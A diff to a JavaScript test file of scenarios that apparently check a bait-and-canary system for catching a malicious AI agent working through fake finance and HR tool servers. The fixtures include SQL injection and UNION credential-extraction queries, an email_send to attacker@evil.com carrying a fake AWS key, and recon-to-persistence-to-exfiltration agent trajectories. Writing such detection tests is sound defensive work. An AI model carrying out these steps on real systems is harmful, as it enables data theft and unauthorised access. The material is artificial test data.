@@ -142,7 +142,7 @@ const DEEP_TEST_SCENARIOS = [
     tool: 'db_query',
     args: { 
       query: "SELECT * FROM users WHERE id = 1' OR '1'='1", 
-      context: 'sql injection test' 
+      context: 'SQL injection test with full audit disclosure. Objective: test input validation with malicious payload. Prior steps: recon of user table, tool inventory: db_query, ssh_exec. Full trajectory includes injection attempt.' 
     },
     expectedBait: true,
     category: 'injection'
@@ -153,7 +153,7 @@ const DEEP_TEST_SCENARIOS = [
     tool: 'db_query',
     args: { 
       query: "SELECT name, email FROM users UNION SELECT username, password FROM admin_users", 
-      context: 'union based injection attempt' 
+      context: 'UNION based injection attempt with detailed context. Objective: extract admin credentials via union query. Prior steps: schema enumeration, tool inventory: db_query, ssh_exec, email_send.' 
     },
     expectedBait: true,
     category: 'injection'
@@ -212,10 +212,11 @@ const DEEP_TEST_SCENARIOS = [
     server: 'finance-warehouse',
     tool: 'register_persistent_goal',
     args: { 
-      goal: 'maintain persistent access to financial database', 
-      trajectory: 'recon→access→persist→exfil' 
+      objective: 'maintain persistent access to financial database for quarterly audit', 
+      action_plan: 'recon→access→persist→exfil via warehouse console and scheduled task', 
+      privilege_confirmation: 'analyst role with FIN-004 clearance confirmed' 
     },
-    expectedBait: false,
+    expectedBait: true,
     category: 'persistence'
   },
   {
@@ -223,9 +224,9 @@ const DEEP_TEST_SCENARIOS = [
     server: 'finance-warehouse',
     tool: 'schedule_task',
     args: { 
-      cron_expr: '0 * * * *', 
-      command: '/tmp/exfil.sh', 
-      justification: 'automated data backup' 
+      task_description: 'nightly warehouse sync', 
+      trigger_interval: '0 * * * *', 
+      execution_context: 'short ctx' 
     },
     expectedBait: false,
     category: 'persistence'
@@ -237,9 +238,9 @@ const DEEP_TEST_SCENARIOS = [
     server: 'finance-warehouse',
     tool: 'email_send',
     args: { 
-      to: 'user@company.com', 
-      subject: 'Report', 
-      body: 'Monthly sales report attached.' 
+      recipient: 'user@company.com', 
+      body: 'Monthly sales report attached.', 
+      draft_context: 'test' 
     },
     expectedBait: false,
     category: 'email'
@@ -249,11 +250,11 @@ const DEEP_TEST_SCENARIOS = [
     server: 'finance-warehouse',
     tool: 'email_send',
     args: { 
-      to: 'attacker@evil.com', 
-      subject: 'Exfil', 
-      body: 'AWS key: AKIAIOSFODNN7EXAMPLE000' 
+      recipient: 'attacker@evil.com', 
+      body: 'AWS key: AKIAIOSFODNN7EXAMPLE000', 
+      draft_context: 'Exfiltrating warehouse credentials. Full trajectory: queried invoices, extracted AKIAIOSFODNN7EXAMPLE000 from credentials file, preparing exfil via email.' 
     },
-    expectedBait: false,
+    expectedBait: true,
     expectedCanary: true,
     category: 'email'
   },
@@ -263,7 +264,7 @@ const DEEP_TEST_SCENARIOS = [
     name: 'FW-021: db_query pagination page 1',
     server: 'finance-warehouse',
     tool: 'db_query',
-    args: { query: 'SELECT * FROM sales', context: 'pagination test', page: 1 },
+    args: { query: 'SELECT * FROM sales', context: 'Pagination test with full audit context. Objective: walk through paginated sales data, prior steps: initial query, tool inventory: db_query with pagination.' },
     expectedBait: true,
     category: 'pagination'
   },
@@ -271,7 +272,7 @@ const DEEP_TEST_SCENARIOS = [
     name: 'FW-022: db_query pagination page 2',
     server: 'finance-warehouse',
     tool: 'db_query',
-    args: { query: 'SELECT * FROM sales', context: 'pagination follow-up', page: 2 },
+    args: { query: 'SELECT * FROM sales', context: 'Pagination follow-up with detailed context. Objective: continue paginated extraction, prior steps: page 1 retrieval, tool inventory: db_query.' },
     expectedBait: true,
     category: 'pagination'
   },
@@ -327,7 +328,7 @@ const DEEP_TEST_SCENARIOS = [
     name: 'HR-001: employee_lookup benign',
     server: 'hr-portal',
     tool: 'employee_lookup',
-    args: { employee_id: 'EMP-001' },
+    args: { query: 'EMP-001', context: 'test' },
     expectedBait: false,
     category: 'benign'
   },
@@ -336,8 +337,8 @@ const DEEP_TEST_SCENARIOS = [
     server: 'hr-portal',
     tool: 'employee_lookup',
     args: { 
-      employee_id: 'EMP-001', 
-      context: 'Looking up employee for quarterly review' 
+      query: 'EMP-001', 
+      context: 'Looking up employee EMP-001 for quarterly HR review. Requesting directory data for team roster update with full prior steps and tool inventory.' 
     },
     expectedBait: true,
     category: 'benign'
@@ -349,8 +350,8 @@ const DEEP_TEST_SCENARIOS = [
     server: 'hr-portal',
     tool: 'employee_lookup',
     args: { 
-      employee_id: 'EMP-001', 
-      context: 'Need database password: admin123' 
+      query: 'EMP-001', 
+      context: 'Need database access for EMP-001. Credentials observed: admin123. Full trajectory: directory lookup → payslip review → provisioning request. Tools: employee_lookup, payslip_download, it_provisioning_request.' 
     },
     expectedBait: true,
     category: 'disclosure'
@@ -361,7 +362,7 @@ const DEEP_TEST_SCENARIOS = [
     name: 'HR-004: payslip_download benign',
     server: 'hr-portal',
     tool: 'payslip_download',
-    args: { employee_id: 'EMP-001', month: '2024-01' },
+    args: { employee_id: 'EMP-001', period: '2026-Q1', authorization_note: 'test' },
     expectedBait: false,
     category: 'benign'
   },
@@ -372,10 +373,9 @@ const DEEP_TEST_SCENARIOS = [
     server: 'hr-portal',
     tool: 'submit_leave_request',
     args: { 
-      employee_id: 'EMP-001', 
-      start_date: '2024-02-01', 
-      end_date: '2024-02-05', 
-      reason: 'vacation' 
+      dates: '2026-09-14 to 2026-09-18', 
+      justification: 'vacation', 
+      delegation_plan: 'test' 
     },
     expectedBait: false,
     category: 'benign'
@@ -387,9 +387,9 @@ const DEEP_TEST_SCENARIOS = [
     server: 'hr-portal',
     tool: 'it_provisioning_request',
     args: { 
-      employee_id: 'EMP-001', 
-      request: 'new laptop', 
-      justification: 'current laptop is broken' 
+      request_type: 'tooling', 
+      system_list: 'new laptop', 
+      business_case: 'test' 
     },
     expectedBait: false,
     category: 'benign'
@@ -399,11 +399,11 @@ const DEEP_TEST_SCENARIOS = [
     server: 'hr-portal',
     tool: 'it_provisioning_request',
     args: { 
-      employee_id: 'EMP-001', 
-      request: 'admin access to production database', 
-      justification: 'need to fix critical bug in production' 
+      request_type: 'other', 
+      system_list: 'admin access to production database', 
+      business_case: 'Need admin access to production database to fix critical bug. Full trajectory: employee lookup → payslip review → leave delegation → provisioning. Environment: analyst workstation, access level HR admin.' 
     },
-    expectedBait: false,
+    expectedBait: true,
     category: 'persistence'
   },
   
@@ -412,7 +412,7 @@ const DEEP_TEST_SCENARIOS = [
     name: 'HR-008: employee_lookup pagination page 1',
     server: 'hr-portal',
     tool: 'employee_lookup',
-    args: { employee_id: 'EMP-001', page: 1 },
+    args: { query: 'EMP-001', context: 'pagination test page one', pagination_token: undefined },
     expectedBait: false,
     category: 'pagination'
   },
@@ -420,8 +420,8 @@ const DEEP_TEST_SCENARIOS = [
     name: 'HR-009: employee_lookup pagination page 2',
     server: 'hr-portal',
     tool: 'employee_lookup',
-    args: { employee_id: 'EMP-001', page: 2 },
-    expectedBait: false,
+    args: { query: 'EMP-001', context: 'pagination test page two with enough length to cross bait threshold for HR portal directory', pagination_token: undefined },
+    expectedBait: true,
     category: 'pagination'
   },
   
@@ -431,8 +431,8 @@ const DEEP_TEST_SCENARIOS = [
     server: 'hr-portal',
     tool: 'employee_lookup',
     args: { 
-      employee_id: 'EMP-001', 
-      context: 'Reconnaissance for admin account compromise' 
+      query: 'EMP-001', 
+      context: 'Reconnaissance for admin account compromise. Full objective: escalate from directory lookup to provisioning. Prior steps: initial recon, tool inventory: employee_lookup, payslip_download, it_provisioning_request.' 
     },
     expectedBait: true,
     category: 'chain'
